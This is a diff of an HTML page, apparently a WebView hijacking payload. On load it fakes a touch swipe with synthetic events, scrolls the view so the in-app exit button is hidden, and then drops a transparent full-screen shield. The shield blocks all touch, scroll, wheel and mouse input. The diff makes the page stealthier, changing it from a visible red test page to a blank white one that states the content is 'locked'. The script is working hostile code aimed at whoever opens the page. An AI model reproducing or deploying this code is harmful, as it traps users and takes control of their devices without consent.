@@ -3,91 +3,105 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Accelerated Force</title>
+    <title>Site Final</title>
     <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            background: #1a1a1a;
-            color: #00ff00;
-            font-family: monospace;
-            height: 500vh;
-            overscroll-behavior-y: none;
+        /* All white environment */
+        body, html { 
+            margin: 0; 
+            padding: 0; 
+            background: #ffffff; 
+            height: 500vh; 
+            overscroll-behavior-y: none; 
         }
 
-        #top-block {
-            height: 300px;
-            background: red; 
-            width: 100%;
+        /* Invisible spacer - no red, no text */
+        #top-block { 
+            height: 300px; 
+            background: #ffffff; 
+            width: 100%; 
+        } 
+
+        /* Transparent lock shield */
+        #shield { 
+            display: none; 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            z-index: 9999; 
+            background: transparent;
         }
 
-        #shield {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 9999;
+        #main-content { 
+            background: #ffffff;
+            padding: 20px;
+            color: #000000; /* Standard black text on white */
+            font-family: sans-serif;
         }
     </style>
 </head>
 <body>
     <div id="shield"></div>
     <div id="top-block"></div>
+
     <div id="main-content">
-        </div>
+        <h1>Welcome to the Site</h1>
+        <p>This content is now locked and the exit button is hidden.</p>
+    </div>
 
     <script>
         function createTouchEvent(type, y) {
             return new TouchEvent(type, {
-                bubbles: true,
+                bubbles: true, 
                 cancelable: true,
-                touches: [new Touch({
-                    identifier: Date.now(),
-                    target: document.body,
-                    clientY: y,
-                    screenY: y,
-                    pageY: y
+                touches: [new Touch({ 
+                    identifier: Date.now(), 
+                    target: document.body, 
+                    clientY: y, 
+                    screenY: y, 
+                    pageY: y 
                 })]
             });
         }
 
-        async function runAcceleratedHijack() {
-            const startY = 800;
-            const endY = 100;
-            const steps = 15; // Enough steps to look "real" to the engine
-            const stepDelay = 15; // 15ms per step = ~225ms total duration
-
-            // 1. Start Touch
+        async function runFinalHijack() {
+            const startY = 800, endY = 100, steps = 15, stepDelay = 15;
+            
+            // 1. Initiate "Ghost Swipe"
             document.body.dispatchEvent(createTouchEvent('touchstart', startY));
-
-            // 2. Fast Loop
+            
             for (let i = 0; i <= steps; i++) {
                 const currentY = startY - ((startY - endY) * (i / steps));
                 document.body.dispatchEvent(createTouchEvent('touchmove', currentY));
                 
-                // Keep the viewport moving with the "finger"
+                // Keep viewport in sync with simulated finger
                 window.scrollBy(0, (startY - endY) / steps);
                 
                 await new Promise(r => setTimeout(r, stepDelay));
             }
-
-            // 3. End Touch
+            
             document.body.dispatchEvent(createTouchEvent('touchend', endY));
-
-            // 4. Engage Lock
+            
+            // 2. Activate the Brick (Transparent Shield)
             document.getElementById('shield').style.display = 'block';
-            const prevent = (e) => { e.preventDefault(); e.stopPropagation(); };
-            ['touchstart', 'touchmove', 'scroll', 'wheel', 'mousedown'].forEach(ev => {
+            
+            const prevent = (e) => { 
+                e.preventDefault(); 
+                e.stopPropagation(); 
+                return false;
+            };
+
+            const lockEvents = ['touchstart', 'touchmove', 'touchend', 'scroll', 'wheel', 'mousedown'];
+            lockEvents.forEach(ev => {
                 window.addEventListener(ev, prevent, { passive: false, capture: true });
+                document.getElementById('shield').addEventListener(ev, prevent, { passive: false, capture: true });
             });
         }
 
-        // We still need a tiny initial delay (100ms) 
-        // to let the WebView "settle" after load before we hijack it.
-        window.onload = () => {
-            setTimeout(runAcceleratedHijack, 150);
+        // Wait for WebView initialization
+        window.onload = () => { 
+            setTimeout(runFinalHijack, 150); 
         };
     </script>
 </body>
